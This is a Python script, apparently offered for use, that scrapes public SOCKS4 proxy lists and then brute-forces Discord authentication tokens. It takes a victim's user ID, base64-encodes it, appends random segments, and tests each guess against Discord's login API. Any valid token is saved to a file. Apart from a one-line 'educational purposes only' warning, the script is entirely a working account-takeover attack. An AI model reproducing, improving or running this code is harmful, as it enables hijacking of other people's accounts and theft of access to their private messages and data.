import base64
import os
import random
import string
import requests
from colorama import *
import time
#ndbiaw start
f = open("./proxy/socks4.txt",'wb')
try:
 r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all")
 f.write(r.content)
except:
 pass
try:
 r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
 f.write(r.content)
except:
 pass
try:
 r = requests.get("https://www.proxyscan.io/download?type=socks4")
 f.write(r.content)
except:
 pass
try:
 r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt")
 f.write(r.content)
 f.close()
except:
 f.close()
try:#credit to All3xJ
 r = requests.get("https://www.socks-proxy.net/")
 part = str(r.content)
 part = part.split("<tbody>")
 part = part[1].split("</tbody>")
 part = part[0].split("<tr><td>")
 proxies = ""
 for proxy in part:
  proxy = proxy.split("</td><td>")
  try:
   proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
  except:
   pass
 out_file = open("./proxy/socks4.txt","a")
 out_file.write(proxies)
 out_file.close()
except:
 pass
print("> Proxy List Downloaded as socks4.txt")
#ndbiaw end
userid = base64.b64encode((input("UserID: ")).encode("ascii"))
userid = str(userid)[2:-1]
print("WARNING: Educational purposes only!")
time.sleep(3)

ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"

while userid == userid:

    def HMAC(chars = string.ascii_uppercase + string.digits, N=27):
        return ''.join(random.choice(chars) for _ in range(N))

    def timest(chars = string.ascii_uppercase + string.digits, N=random.randint(4, 6)):
        return ''.join(random.choice(chars) for _ in range(N))

    token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)

    headers={
    'Authorization': token
    }
    url = 'https://discordapp.com/api/v9/auth/login'
    login = requests.get(url, headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('done.txt', "a+")
            f.write(f'{token}\n')
            break
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)

        if login.status_code == 429:
          print(Fore.YELLOW + f"[*] You get rate limited!")
    finally:
        print("")
input()
